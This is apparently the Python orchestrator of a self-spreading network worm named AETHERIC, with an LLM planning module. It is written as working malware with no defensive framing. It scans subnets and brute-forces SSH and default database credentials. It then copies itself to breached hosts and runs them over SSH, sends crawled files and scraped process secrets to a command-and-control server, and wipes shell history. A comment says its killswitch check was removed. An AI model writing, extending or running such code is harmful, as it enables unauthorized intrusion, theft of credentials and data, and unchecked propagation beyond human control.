"""
State machine orchestrator: controls phases and main loop.
"""
import time
import json
import os
import sys
import subprocess
import threading
from typing import Dict, Any, List
from modules.network_recon import NetworkRecon
from modules.file_crawler import FileCrawler
from modules.privesc_engine import PrivescEngine
from modules.attack_planner import AttackPlanner
from modules.worm_replicator import WormReplicator
from modules.process_scraper import ProcessScraper
from core.llm_brain import LLMBrain
from core.c2_sync import C2Sync
from core.anti_forensics import AntiForensics
from utils.logging_utils import get_logger
from utils.net_utils import get_local_ip

logger = get_logger(__name__)

class Orchestrator:
    PHASES = ['SURVEY', 'ENUMERATE', 'ESCALATE', 'EXFILTRATE', 'PROPAGATE', 'HIBERNATE']

    def __init__(self, child_mode=False, parent_ip=None):
        self.child_mode = child_mode
        self.parent_ip = parent_ip
        self.phase = 0
        self.state = {}
        self.targets = []
        self.compromised = set()
        self.findings = []
        self.llm = LLMBrain()
        self.c2 = C2Sync()
        self.af = AntiForensics()
        self.net = NetworkRecon()
        self.fc = FileCrawler()
        self.pe = PrivescEngine()
        self.ap = AttackPlanner()
        self.wr = WormReplicator()
        self.ps = ProcessScraper()
        self.running = True
        self._background_scan_started = False

    def run(self):
        logger.info("AETHERIC orchestrator started. Child mode: %s", self.child_mode)
        self.af.scrub_history()

        while self.running:
            logger.info("=== Loop iteration start (running=%s, phase=%s) ===", self.running, self.phase)
            try:
                self._execute_phase()
                logger.info("=== Phase completed, sleeping 5s ===")
                time.sleep(5)
            except Exception as e:
                logger.exception("Phase execution error: %s", str(e))
                with open('/tmp/.aetheric_err', 'a') as f:
                    f.write(f"{time.time()}: {str(e)}\n")
                time.sleep(60)

            # ============================================================
            # KILLSWITCH DETECTION – REMOVED (no longer checks /tmp/.aetheric_kill)
            # ============================================================

        logger.info("=== Exiting main loop (running=%s) ===", self.running)

    def _execute_phase(self):
        phase_name = self.PHASES[self.phase % len(self.PHASES)]
        logger.info("Entering phase: %s", phase_name)

        if phase_name == 'SURVEY':
            self._phase_survey()
        elif phase_name == 'ENUMERATE':
            self._phase_enumerate()
        elif phase_name == 'ESCALATE':
            self._phase_escalate()
        elif phase_name == 'EXFILTRATE':
            self._phase_exfiltrate()
        elif phase_name == 'PROPAGATE':
            self._phase_propagate()
        elif phase_name == 'HIBERNATE':
            self._phase_hibernate()

        self.phase += 1

    def _phase_survey(self):
        ip = get_local_ip()
        subnets = self.net.get_expanded_subnets(ip)

        # Scan /24 synchronously
        subnet = subnets[0]
        logger.info("Scanning subnet: %s", subnet)
        hosts = self.net.ping_sweep(subnet)
        logger.info("Discovered %d hosts in %s", len(hosts), subnet)
        for host in hosts:
            if host not in [t['ip'] for t in self.targets] and host not in self.compromised:
                ports = self.net.quick_scan(host)
                if ports:
                    self.targets.append({'ip': host, 'ports': ports})
        for t in self.targets:
            self.c2.upload_target(t)

        # Start /16 background scan
        if len(subnets) > 1 and not self._background_scan_started:
            self._background_scan_started = True
            def background_scan():
                logger.info("Background scan started for: %s", subnets[1])
                bg_hosts = self.net.ping_sweep(subnets[1])
                logger.info("Background scan discovered %d hosts in %s", len(bg_hosts), subnets[1])
                for host in bg_hosts:
                    if host not in [t['ip'] for t in self.targets] and host not in self.compromised:
                        ports = self.net.quick_scan(host)
                        if ports:
                            self.targets.append({'ip': host, 'ports': ports})
                            self.c2.upload_target({'ip': host, 'ports': ports})
            threading.Thread(target=background_scan, daemon=True).start()

    def _fallback_actions(self, ip, services):
        actions = []
        for svc in services:
            if svc.get('port') == 22:
                actions.append({'type': 'brute', 'target': ip, 'port': 22, 'user': 'root', 'pass': 'root'})
                actions.append({'type': 'brute', 'target': ip, 'port': 22, 'user': 'admin', 'pass': 'admin'})
            if svc.get('port') == 3306:
                actions.append({'type': 'default_creds', 'target': ip, 'port': 3306, 'user': 'root', 'pass': ''})
            if svc.get('port') == 445:
                actions.append({'type': 'null_session', 'target': ip, 'port': 445})
        return actions[:5]

    def _phase_enumerate(self):
        for target in self.targets[:]:
            if target['ip'] in self.compromised:
                continue
            svc = self.net.service_scan(target['ip'], target['ports'])
            actions = self._fallback_actions(target['ip'], svc)
            target['actions'] = actions

    def _phase_escalate(self):
        # Parallel Hydra on all SSH targets
        ssh_targets = [
            t for t in self.targets
            if 22 in t.get('ports', []) and t['ip'] not in self.compromised
        ]
        if ssh_targets:
            results = self.ap.brute_force_parallel(ssh_targets)
            for ip, creds in results.items():
                user, password = creds[0]
                if self.ap.brute_ssh(ip, user, password):
                    self.compromised.add(ip)
                    self.wr.replicate(ip, self.parent_ip or '0.0.0.0')
                    self.c2.mark_compromised(ip)

        # Fallback for other services
        for target in self.targets:
            if target['ip'] in self.compromised:
                continue
            for action in target.get('actions', []):
                if action['type'] == 'brute':
                    success = self.ap.brute_ssh(action['target'], action['user'], action['pass'])
                elif action['type'] == 'default_creds':
                    success = self.ap.try_default_creds(action['target'], action['port'])
                elif action['type'] == 'cve':
                    success = self.ap.run_cve(action['target'], action['cve_id'])
                else:
                    continue
                if success:
                    self.compromised.add(target['ip'])
                    self.wr.replicate(target['ip'], self.parent_ip or '0.0.0.0')
                    self.c2.mark_compromised(target['ip'])
                    break

    def _phase_exfiltrate(self):
        findings = self.fc.crawl()
        for finding in findings:
            self.c2.upload_finding(finding)
        secrets = self.ps.scrape()
        for secret in secrets:
            self.c2.upload_finding(secret)
        local_ip = get_local_ip()
        for ip in self.compromised:
            if ip != local_ip:
                self._remote_deep_scan(ip)

    def _remote_deep_scan(self, ip):
        remote_cmd = (
            f"ssh -o StrictHostKeyChecking=no root@{ip} "
            f"'cd /usr/local/aetheric && ./venv/bin/python main.py --child --parent-ip {self.parent_ip or '0.0.0.0'}'"
        )
        subprocess.Popen(remote_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        logger.info("Launched remote deep scan on %s", ip)

    def _phase_propagate(self):
        new_targets = self.c2.get_pending_targets()
        for nt in new_targets:
            if nt not in self.compromised and nt not in [t['ip'] for t in self.targets]:
                self.targets.append({'ip': nt, 'ports': []})

    def _phase_hibernate(self):
        logger.info("Hibernating for 900 seconds")
        time.sleep(900)